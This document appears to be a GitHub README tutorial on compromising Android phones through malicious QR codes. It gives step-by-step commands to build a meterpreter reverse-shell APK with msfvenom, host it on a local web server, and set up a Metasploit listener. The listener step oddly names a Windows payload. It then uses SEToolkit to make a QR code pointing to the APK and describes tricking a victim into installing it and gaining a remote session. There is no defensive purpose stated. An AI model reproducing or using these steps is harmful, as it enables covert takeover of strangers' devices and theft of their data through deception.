# IN THIS TOTURIAL YOU WILL LEARN HOW TO ATTACK DEVICES USING QR CODES WHO SCAN THEM.


##TERMINAL-1. 


STEP 1 -  sudo su 

STEP 2 -  cd Desktop

STEP 3 -  mkdir payload 

STEP 4 -  cd payload 

STEP 5 -  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.74 LPORT=4444 R> filename.apk 

______________________________________________________________________________________________________________________________________________________________________________________

Here's what each option in the command means:
______________________________________________________________________________________________________________________________________________________________________________________

|–platform android: set the target platform to android

|-p android/meterpreter/reverse_tcp: set the payload to a reverse TCP meterpreter

|LHOST=192.168.0.74: set the local host to the kali linux machine ip address

|LPORT=4444: set the local port to whatever port you want

______________________________________________________________________________________________________________________________________________________________________________________

payload will be generated. Open the file explorer in kali,
look for the payload then open a new terminal in that location where there is payload.



## TERMINAL-2.

STEP   -  sudo cd /Desktop/payload

STEP 6 -  python3 -m http.server     (running a simple http server so that the payload can be downloaded on the victims machine.)

now go back to the TERMINAL-1.

STEP 7 -  use exploit/multi/handler      (command designed for creating reverse shell connections.)

STEP 8 -  set payload windows/meterpreter/reverse_tcp   

STEP 9 -  set LHOST 192.168.0.?       (set LHOST <Kali Linux IP> which was given in the payload as well)

STEP 10 -  set LPORT 4444               (set LPORT <port> the same port number that was given while creating the payload)

STEP 11 -  exploit        (to run the commands you can use either "exploit" or "run" command)

STEP 12 -  help       (to view the command that can be run after the sucessfull reverse shell of android)

# Remember, do not close the terminal.
_________________________________________________________________________________________________________________________________________________________________________________________


## TERMINAL-3.


STEP 13 - Open another terminal, type “setoolkit”, and press [Enter].

STEP 14 - Type “1” (to select “Social-Engineering Attacks”) and press [Enter].

STEP 15 - Next, type “8” (to select “QRCode Generator Attack Vector”) and press [Enter]. When requested, type the IP address you used before followed by “/” and the payload, in this case “test.apk”. 

The format is the following: “youripaddress/nameofthepayload.apk”.

STEP 16 - Exit SEToolkit and type “cd /root/.set/reports” to find the folder where the QR code has been saved. At this point, the threat actor must use social engineering to convince the target to scan the code.


# The target scans the QR code. He receives a request to download the application.
He is convinced that he is downloading an application he needs. Therefore, he follows the steps and successfully installs the app.
The moment the app is installed on the target’s device, the threat actor notices that a meterpreter session is now open. Typing “sysinfo” allows him to check if the operation has been successful.
After confirming the positive results, he types “help” to visualize the many commands that can be executed.









____________________________________________________________________________________________________________________________________________
▶ Name: StromWise

▶ Role: Creator

▶ Location: Unknown

▶ GitHub: https://github.com/stromwise 

▶ Instagram: https://www.instagram.com/stromwise/ 

▶ Facebook: https://www.facebook.com/profile.php?id=100093706328777

▶ Youtube: https://www.youtube.com/channel/UC-tafc0TqgZNnQio8Gj-hjg 

▶ Twitter: https://twitter.com/StromWise 
____________________________________________________________________________________________________________________________________________


